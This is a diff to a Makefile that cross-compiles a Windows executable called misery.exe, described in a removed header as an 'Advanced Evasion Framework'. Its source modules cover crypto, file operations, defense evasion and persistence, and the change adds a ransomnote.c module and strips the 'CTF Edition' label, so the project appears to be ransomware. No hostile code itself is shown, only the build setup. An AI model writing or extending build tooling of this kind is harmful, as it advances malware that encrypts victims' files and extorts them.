@@ -18,19 +18,17 @@
 
 
 
-# Makefile - Misery v3.2 (Advanced Evasion Framework)
 # Cross-compiler: x86_64-w64-mingw32-gcc
-# Author: Professional CTF Edition
 
 CC      = x86_64-w64-mingw32-gcc
 CFLAGS  = -Os -s -Wall -Wextra -fno-stack-protector -fvisibility=hidden -masm=intel
-LIBS    = -ladvapi32 -luser32 -lshell32 -lshlwapi -lntdll -lws2_32 -liphlpapi -lole32 -luuid -lbcrypt
+LIBS    = -ladvapi32 -luser32 -lshell32 -lshlwapi -lntdll -lws2_32 -liphlpapi -lole32 -luuid -lbcrypt -lgdi32 -lcomctl32
 
 BUILD_DIR = build
 
-SRCS    = misery.c misery_config.c crypto.c fileops.c defense.c security.c persistence.c utils.c
+SRCS    = misery.c misery_config.c crypto.c fileops.c defense.c security.c persistence.c utils.c ransomnote.c
 OBJS    = $(SRCS:.c=.o)
-HEADERS = misery.h misery_config.h crypto.h fileops.h defense.h security.h persistence.h utils.h
+HEADERS = misery_config.h crypto.h fileops.h defense.h security.h persistence.h utils.h ransomnote.h
 
 TARGET  = $(BUILD_DIR)/misery.exe
 
